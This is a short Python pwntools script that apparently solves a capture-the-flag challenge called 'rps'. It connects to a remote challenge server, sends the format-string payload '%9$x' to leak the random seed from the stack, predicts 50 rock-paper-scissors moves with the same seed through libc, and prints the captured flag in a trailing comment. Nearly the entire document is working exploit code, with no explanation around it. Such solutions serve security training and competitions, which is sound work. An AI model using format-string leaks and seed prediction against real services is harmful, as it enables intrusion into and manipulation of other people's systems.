#!/usr/bin/env python3

from pwn import *
import ctypes

p64 = lambda x: util.packing.p64(x, endian='little')
u64 = lambda x: util.packing.u64(x, endian='little')
p32 = lambda x: util.packing.p32(x, endian='little')
u32 = lambda x: util.packing.u32(x, endian='little')

exe = ELF("./rps_patched")

context.binary = exe
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']


def conn():
	if args.LOCAL:
		r = gdb.debug([exe.path])
	elif args.REMOTE:
		r = remote("vsc.tf", 3094)
	else:
		r = process([exe.path])
	return r


def main():
	r = conn()

	r.sendlineafter(b'name', b'%9$x')
	r.recvuntil(b'Hi ')
	srand = int(r.recvline().strip(), 16)
	success(f'{hex(srand)=}')

	libc = ctypes.CDLL("libc.so.6")
	libc.srand(srand)

	for _ in range(50):
		v = libc.rand() % 3
		print(v)
		if v == 0:
			r.sendlineafter(b':', b'p')
		elif v == 1:
			r.sendlineafter(b':', b's')
		elif v == 2:
			r.sendlineafter(b':', b'r')

	r.interactive()


if __name__ == "__main__":
	main()

# vsctf{Wh4t_da_h3ck_br0_gu355_g0d_kn0ws_4ll_my_m0v3s_:(((}
